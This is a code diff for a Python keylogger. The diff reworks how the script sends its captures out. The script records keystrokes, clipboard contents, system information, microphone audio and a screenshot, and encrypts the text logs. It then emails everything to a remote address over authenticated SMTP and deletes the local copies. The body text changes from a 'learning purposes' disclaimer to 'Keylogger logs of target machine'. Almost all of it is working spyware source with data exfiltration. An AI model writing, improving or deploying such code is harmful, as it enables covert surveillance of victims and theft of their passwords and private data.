@@ -46,46 +46,60 @@ keystroke_count = 0
 line_count = 0
 microphone_time = 10
 fromAddress = os.getenv('FROM_EMAIL_ADDRESS')
-password = os.getenv('PASSWORD')
+host = os.getenv('HOST')
 toAddress = os.getenv('TO_EMAIL_ADDRESS')
-key = os.getenv('KEY')
+port = os.getenv('PORT')
+api_key = os.getenv('API_KEY')
+enc_key = os.getenv('ENC_KEY')
+username = "api"
 
-def send_email(filename, attachment, toAddress):
+def send_email():
+	email = prepare_email()
+	print("Mail prepared...")
+
+	try:
+		with smtplib.SMTP(host, port) as server:
+			server.starttls()
+			server.login(username, api_key)
+			server.sendmail(fromAddress, toAddress, email)
+			print("Email sent successfully")
+	except:
+		print("Failed to send email")
+
+def prepare_email():
+	# Create a multipart message
 	msg = MIMEMultipart()
+
+	# Set the email headers
 	msg['From'] = fromAddress
 	msg['To'] = toAddress
 	msg['Subject'] = "Keylogger logs"
 
-	body = "This email is for learning purposes"
+	body = "Keylogger logs of target machine"
+
+	# Add the body of the email
 	msg.attach(MIMEText(body, 'plain'))
 
-	attachment = open(attachment, 'rb')
+	attachment_paths = [enc_log, enc_clipboard, enc_system, audio_file_path, image_file_path]
+	attachment_filenames = ["log.txt", "clipboard.txt", "system.txt", "audio.wav", "screenshot.png"]
 
-	mime_base = MIMEBase('application', 'octet-stream')
-	mime_base.set_payload((attachment).read())
 
-	encoders.encode_base64(mime_base)
+	# Attach files to the email
+	for path, filename in zip(attachment_paths, attachment_filenames):
+		with open(path, 'rb') as attachment:
+			# Create a MIMEBase object
+			mime_base = MIMEBase('application', 'octet-stream')
+			# Set the payload of the attachment
+			mime_base.set_payload(attachment.read())
+			# Encode the attachment using base64
+			encoders.encode_base64(mime_base)
+			# Add the filename to the attachment header
+			mime_base.add_header('Content-Disposition', f'attachment; filename="{filename}"')
+			# Attach the attachment to the message
+			msg.attach(mime_base)
 
-	mime_base.add_header('Content-Disposition', "attachment: filename= %s" % filename)
-
-	msg.attach(mime_base)
-
-	smtp = smtplib.SMTP('smtp.gmail.com', 587)
-	smtp.starttls()
-
-	try :
-		smtp.login(fromAddress, password)
-	except Exception as e :
-		print("Login failed")
-
-	text = msg.as_string()
-
-	try :
-		smtp.sendmail(fromAddress, toAddress, text)
-	except Exception as e :
-		print("Failed to send mail")
-
-	smtp.quit()
+	# Return the message as a string
+	return msg.as_string()
 
 def on_press(key):
 	global buffer, keystroke_count, line_count
@@ -106,9 +120,8 @@ def info():
 	return """\n\
 =======================\n\
 Text length : {0}\n\
-No of keystrokes : {1}\n\
-No of lines : {2}\n\
-=======================\n""".format(len(buffer), keystroke_count,line_count + 1)
+No of lines : {1}\n\
+=======================\n""".format(len(buffer), line_count + 1)
 
 def microphone():
 	freq = 44100
@@ -155,42 +168,56 @@ def copy_clipboard():
 		except:
 			out.write("Clipboard cannot be copied")
 
-def screenshot():
+def take_screenshot():
 	image = ImageGrab.grab()
 	image.save(image_file_path)
 
-def send_files_via_emails():
-	files_to_send = [log_file_path, clipboard_path, system_info_path, audio_file_path, image_file_path]
-	for file in files_to_send:
-		send_email(file, file, toAddress)
-
+def remove_files():
+    encrypted_files = [enc_log, enc_clipboard, enc_system] # modify this to delete more files
+    for file_path in encrypted_files:
+        try:
+            os.remove(file_path)
+            print(f"File '{file_path}' removed successfully.\n")
+        except FileNotFoundError:
+            print(f"File '{file_path}' not found.\n")
+        except PermissionError:
+            print(f"Permission denied: unable to remove file '{file_path}'.\n")
+        except Exception as e:
+            print(f"Error occurred while removing file '{file_path}': {e}\n")
 
 def on_release(key):
 	# break loop on pressing esc
 	if key == Key.esc :
 		write_log()
+		print("Log written...")
 		write_system_info()
+		print("System info written...")
 		copy_clipboard()
-		screenshot()
-		send_files_via_emails()
+		print("Clipboard checked...")
+		take_screenshot()
+		print("Screenshot taken...")
 		encrypt_files()
+		print("Files encrypted")
+		send_email()
+		remove_files()
+		print("Files removed")
 		return False
 
 def encrypt_files():
-    files_to_encrypt = [log_file_path, clipboard_path, system_info_path]
-    encrypted_files = [enc_log, enc_clipboard, enc_system]
-    enc_idx = 0
-    for file in files_to_encrypt:
-        with open(file, 'rb') as f:
-            data = f.read()
-        
-        fernet = Fernet(key)
-        encrypted = fernet.encrypt(data)
-        
-        with open(encrypted_files[enc_idx], 'wb') as f:
-            f.write(encrypted)
-        
-        enc_idx += 1
+	files_to_encrypt = [log_file_path, clipboard_path, system_info_path]
+	encrypted_files = [enc_log, enc_clipboard, enc_system]
+	enc_idx = 0
+	for file in files_to_encrypt:
+		with open(file, 'rb') as f:
+			data = f.read()
+		
+		fernet = Fernet(enc_key)
+		encrypted = fernet.encrypt(data)
+		
+		with open(encrypted_files[enc_idx], 'wb') as f:
+			f.write(encrypted)
+		
+		enc_idx += 1
 
 print("Keylogger Started...")
 
